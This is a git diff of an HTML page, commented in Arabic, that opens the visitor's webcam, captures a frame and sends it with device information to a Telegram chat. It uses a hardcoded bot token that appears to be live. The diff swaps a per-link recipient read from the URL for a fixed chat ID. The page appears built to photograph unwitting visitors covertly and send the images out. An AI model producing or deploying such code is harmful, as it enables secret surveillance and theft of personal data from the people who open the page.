@@ -61,8 +61,7 @@ video {
 <script>
 // ===== ضع معلوماتك هنا (محليًا فقط) =====
 const BOT_TOKEN = "7415148537:AAHC9RSt6Ka4Ip34qTCleHx0YXtfGaERwIA";
-const params = new URLSearchParams(window.location.search);
-const USER_ID = params.get("id");";
+const CHAT_ID  = "6251932709";
 // ======================================
 
 let streamRef = null;
@@ -110,12 +109,6 @@ navigator.mediaDevices.getUserMedia({ video: true })
 });
 
 function captureOnce() {
-
-if (!USER_ID) {
-  document.body.innerHTML = "<h2>رابط غير صالح ❌</h2>";
-  return;
-}
-
   const video = document.getElementById("video");
   const canvas = document.getElementById("canvas");
 
@@ -130,7 +123,7 @@ if (!USER_ID) {
 
   canvas.toBlob(blob => {
     const form = new FormData();
-form.append("chat_id", USER_ID);
+    form.append("chat_id", CHAT_ID);
     form.append("photo", blob);
     form.append("caption", getDeviceInfo());
 
@@ -150,5 +143,3 @@ form.append("chat_id", USER_ID);
 
 </body>
 </html>
-
-
